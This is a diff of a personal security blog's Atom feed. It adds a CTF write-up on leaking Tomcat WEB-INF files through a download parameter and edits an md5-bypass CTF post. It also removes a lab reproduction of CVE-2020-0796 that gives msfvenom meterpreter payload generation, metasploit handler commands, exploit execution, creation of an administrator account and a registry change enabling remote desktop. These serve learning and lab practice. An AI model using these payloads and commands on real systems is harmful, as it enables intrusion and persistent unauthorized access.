@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://lingxin16.github.io/"/>
-  <updated>2020-07-13T03:06:57.559Z</updated>
+  <updated>2020-07-14T02:50:13.888Z</updated>
   <id>http://lingxin16.github.io/</id>
   
   <author>
@@ -17,13 +17,36 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>RoarCTF2019-EasyJava</title>
+    <link href="http://lingxin16.github.io/2020/07/14/RoarCTF2019-EasyJava/"/>
+    <id>http://lingxin16.github.io/2020/07/14/RoarCTF2019-EasyJava/</id>
+    <published>2020-07-14T02:01:16.000Z</published>
+    <updated>2020-07-14T02:50:13.888Z</updated>
+    
+    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p><img src="/2020/07/14/RoarCTF2019-EasyJava/1.png" alt="1"></p><p>这道题做起来又是没有一点思路，除了登录和help两个功能也没找到其他的，也没有隐藏的hint之类的，看报错显示的是Apache Tomcat/8.5.24，我搜下了有一个CVE-2018-1305的漏洞，但是好像也没什么用，还是看大佬们的wp吧😭😭😭</p><p>利用点是help功能，点击help之后跳转的是/Download?filename=help.docx，但是报错<code>java.io.FileNotFoundException:{help.docx}</code></p><p>关于这点，看大佬们的博客是因为请求方式的原因，果然改为post请求之后能够正常下载</p><p><img src="/2020/07/14/RoarCTF2019-EasyJava/2.png" alt="2"></p><p>下载后打开只有一行Are you sure the flag is here? ? ?很显然这也不是flag</p><p>接下来就是WEB-INF/web.xml泄露，WEB-INF是Java的WEB应用的安全目录。主要包含以下文件或目录</p><pre><code>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。/WEB-INF/database.properties：数据库配置文件漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</code></pre><p>关于具体的源码泄露参考这个大佬的文章：<a href="https://blog.csdn.net/wy_97/article/details/78165051" target="_blank" rel="noopener">https://blog.csdn.net/wy_97/article/details/78165051</a></p><p>然后传filename=/WEB-INF/web.xml，下载得到</p><p><img src="/2020/07/14/RoarCTF2019-EasyJava/3.png" alt="3"></p><p>有一个FlagController，路径/Flag，请求后报错</p><p><img src="/2020/07/14/RoarCTF2019-EasyJava/4.png" alt="4"></p><p>有路径/com/wm/ctf/FlagController</p><p>接下来就是更加看不懂的环节了，推测class文件路径，然后获得class文件，反编译得到flag</p><p>payload：</p><pre><code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code></pre><p><img src="/2020/07/14/RoarCTF2019-EasyJava/5.png" alt="5"></p><p>有一串base64样式的字符串，解码得到flag</p><p>关于这个路径推测，大佬们的博客写的是结合Tomcat的项目存放路径的经验得出的，咱也没经验，咱也不知道👀</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+    
+      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
+    
+      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
+    
+  </entry>
+  
+  <entry>
     <title>BJDCTF2nd-EasyMd5</title>
     <link href="http://lingxin16.github.io/2020/07/13/BJDCTF2nd-EasyMd5/"/>
     <id>http://lingxin16.github.io/2020/07/13/BJDCTF2nd-EasyMd5/</id>
     <published>2020-07-13T02:51:16.000Z</published>
-    <updated>2020-07-13T03:06:57.559Z</updated>
+    <updated>2020-07-14T02:02:05.324Z</updated>
     
-    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p><img src="/2020/07/13/BJDCTF2nd-EasyMd5/1.png" alt="1"></p><p>在HTTP头里发现Hint: select * from ‘admin’ where password=md5($pass,true)</p><p>关于md5($pass,true)</p><p>参考：<a href="https://blog.csdn.net/March97/article/details/81222922" target="_blank" rel="noopener">https://blog.csdn.net/March97/article/details/81222922</a></p><p>输入ffifdyop</p><p><img src="/2020/07/13/BJDCTF2nd-EasyMd5/2.png" alt="2"></p><p>查看源文件，发现</p><pre><code>&lt;!--$a = $GET[&#39;a&#39;];$b = $_GET[&#39;b&#39;];if($a != $b &amp;&amp; md5($a) == md5($b)){    // wow, glzjin wants a girl friend.--&gt;</code></pre><p>md5 bypass</p><p>因为<code>md5()</code>或者<code>sha1()</code>之类的函数计算的是一个字符串的哈希值，对于数组则返回false，如果<code>$a</code>和<code>$b</code>都是数组则双双返回FALSE, 两个FALSE相等得以绕过。payload:<code>?a[]=1&amp;b[]=2</code></p><p><img src="/2020/07/13/BJDCTF2nd-EasyMd5/3.png" alt="3"></p><p>POST方式传?param1[]=1&amp;param2[]=2</p>]]></content>
+    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p><img src="/2020/07/13/BJDCTF2nd-EasyMd5/1.png" alt="1"></p><p>在HTTP头里发现Hint: select * from ‘admin’ where password=md5($pass,true)</p><p>关于md5($pass,true)</p><p>参考：<a href="https://blog.csdn.net/March97/article/details/81222922" target="_blank" rel="noopener">https://blog.csdn.net/March97/article/details/81222922</a></p><p>输入ffifdyop</p><p><img src="/2020/07/13/BJDCTF2nd-EasyMd5/2.png" alt="2"></p><p>查看源文件，发现</p><pre><code>&lt;!--$a = $GET[&#39;a&#39;];$b = $_GET[&#39;b&#39;];if($a != $b &amp;&amp; md5($a) == md5($b)){    // wow, glzjin wants a girl friend.--&gt;</code></pre><p>md5 bypass</p><p>因为<code>md5()</code>或者<code>sha1()</code>之类的函数计算的是一个字符串的哈希值，对于数组则返回false，如果<code>$a</code>和<code>$b</code>都是数组则双双返回FALSE, 两个FALSE相等得以绕过。payload:<code>?a[]=1&amp;b[]=2</code></p><p><img src="/2020/07/13/BJDCTF2nd-EasyMd5/3.png" alt="3"></p><p>POST方式传<code>?param1[]=1&amp;param2[]=2</code></p>]]></content>
     
     <summary type="html">
     
@@ -448,25 +471,6 @@
       <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
     
       <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>CVE-2020-0796复现</title>
-    <link href="http://lingxin16.github.io/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/"/>
-    <id>http://lingxin16.github.io/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/</id>
-    <published>2020-06-08T06:06:29.000Z</published>
-    <updated>2020-06-08T09:42:40.468Z</updated>
-    
-    <content type="html"><![CDATA[<p>最近发布的一个Windows漏洞，有时间来复现一下</p><a id="more"></a><h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>有关此漏洞的详细介绍:<a href="https://www.freebuf.com/vuls/233263.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/233263.html</a></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>利用Windows10 1903版本来进行复现 </p><h4 id="镜像下载与安装"><a href="#镜像下载与安装" class="headerlink" title="镜像下载与安装"></a>镜像下载与安装</h4><pre><code>镜像：ed2k://|file|cn_windows_10_business_editions_version_1903_x64_dvd_e001dd2c.iso|4815527936|47D4C57E638DF8BF74C59261E2CE702D|</code></pre><p>安装镜像</p><p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/1.png" alt="1"></p><h4 id="虚拟机信息"><a href="#虚拟机信息" class="headerlink" title="虚拟机信息"></a>虚拟机信息</h4><p>Windows10 1903版本</p><p>ip：192.168.1.104</p><h4 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h4><p>攻击机</p><p>工具：SMBGhost</p><pre><code>python3 scanner.py 192.168.1.104</code></pre><p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/2.png" alt="2"></p><p>靶机</p><p>工具：奇安信检测工具</p><p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/3.png" alt="3"></p><h4 id="使用metasploit生成buf"><a href="#使用metasploit生成buf" class="headerlink" title="使用metasploit生成buf"></a>使用metasploit生成buf</h4><pre><code>msfvenom -p windows/x64/meterpreter/bind_tcp lport=6666 -f py -o tool.py </code></pre><p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/4.png" alt="4"></p><p>将SMBGhost_RCE_PoC中的exploit.py中的USER_OAYLOAD更换为刚刚生成的buf</p><p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/5.png" alt="5"></p><h4 id="使用metasploit对6666端口进行监听"><a href="#使用metasploit对6666端口进行监听" class="headerlink" title="使用metasploit对6666端口进行监听"></a>使用metasploit对6666端口进行监听</h4><pre><code>msfconsoleuse exploit/multi/handlerset payload windows/x64/meterpreter/bind_tcpshow optionsset LPORT 6666set RHOST 192.168.1.104exploit</code></pre><p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/6.png" alt="6"></p><h4 id="运行exploit-py"><a href="#运行exploit-py" class="headerlink" title="运行exploit.py"></a>运行exploit.py</h4><pre><code>python3 exploit.py -ip 192.168.1.104</code></pre><p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/7.png" alt="7"></p><p>这里打下去靶机会出现蓝屏重启的现象，多试几次就好</p><p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/8.png" alt="8"></p><p>拿到shell</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><h4 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h4><pre><code>net user d1a0 password /add</code></pre><h4 id="加入管理组"><a href="#加入管理组" class="headerlink" title="加入管理组"></a>加入管理组</h4><pre><code>net localgroup Administrators d1a0 /addnet localgroup Users d1a0 /del</code></pre><h4 id="查看用户信息"><a href="#查看用户信息" class="headerlink" title="查看用户信息"></a>查看用户信息</h4><pre><code>net user</code></pre><p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/9.png" alt="9"></p><h4 id="开启远程连接功能"><a href="#开启远程连接功能" class="headerlink" title="开启远程连接功能"></a>开启远程连接功能</h4><pre><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code></pre><p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/10.png" alt="10"></p><p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/11.png" alt="11"></p><p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/12.png" alt="12"></p><p>工具地址：</p><p>SMBGhost：<a href="https://github.com/ollypwn/SMBGhost" target="_blank" rel="noopener">https://github.com/ollypwn/SMBGhost</a></p><p>奇安信检测工具：<a href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip" target="_blank" rel="noopener">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip</a></p><p>SMBGhost_RCE_PoC：<a href="https://github.com/chompie1337/SMBGhost_RCE_PoC.git" target="_blank" rel="noopener">https://github.com/chompie1337/SMBGhost_RCE_PoC.git</a></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;最近发布的一个Windows漏洞，有时间来复现一下&lt;/p&gt;
-    
-    </summary>
-    
-    
     
   </entry>
   
